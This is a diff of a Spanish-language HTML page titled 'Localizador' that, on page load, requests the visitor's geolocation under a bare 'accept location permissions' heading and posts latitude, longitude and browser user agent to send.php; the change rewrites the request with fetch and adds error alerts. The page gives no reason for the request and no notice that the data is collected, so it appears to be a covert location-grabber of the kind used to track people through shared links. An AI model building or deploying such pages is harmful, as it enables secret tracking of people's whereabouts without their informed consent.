@@ -1,18 +1,61 @@
-<html>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Localizador</title>
+</head>
 <body onload="getLocation()">
-<script>
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  }
-}
+    <h1>Acepte los permisos de Ubicación</h1>
 
-function showPosition(position) {
-  const xhttp = new XMLHttpRequest();
-  xhttp.open("GET", "send.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&agent=" + navigator.userAgent )
-  xhttp.send();
-}
-</script>
-<h1>Acepte los permisos de Ubicación</h1>
+    <script>
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendPosition, showError);
+        } else {
+            alert("La geolocalización no está soportada por este navegador.");
+        }
+    }
+
+    function sendPosition(position) {
+        const data = {
+            lat: position.coords.latitude,
+            long: position.coords.longitude,
+            agent: navigator.userAgent
+        };
+
+        fetch('send.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log('Respuesta del servidor:', data);
+        })
+        .catch(error => {
+            console.error('Error al enviar los datos:', error);
+        });
+    }
+
+    function showError(error) {
+        switch (error.code) {
+            case error.PERMISSION_DENIED:
+                alert("El usuario ha denegado la solicitud de geolocalización.");
+                break;
+            case error.POSITION_UNAVAILABLE:
+                alert("La información de la ubicación no está disponible.");
+                break;
+            case error.TIMEOUT:
+                alert("La solicitud para obtener la ubicación ha expirado.");
+                break;
+            case error.UNKNOWN_ERROR:
+                alert("Ocurrió un error desconocido.");
+                break;
+        }
+    }
+    </script>
 </body>
 </html>
